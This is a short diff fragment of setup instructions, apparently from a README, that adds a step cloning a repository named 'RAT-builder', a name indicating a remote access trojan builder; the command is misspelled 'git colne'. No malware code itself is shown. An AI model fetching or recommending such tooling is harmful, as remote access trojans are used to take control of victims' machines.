@@ -8,6 +8,7 @@ Download and install Python 3.8+ from python.org
 
 Step 2 — Clone the Repository
 
+ git colne https://github.com/ademy6220-arch/RAT-builder.git
 
 
 Step 3 — Install Dependencies
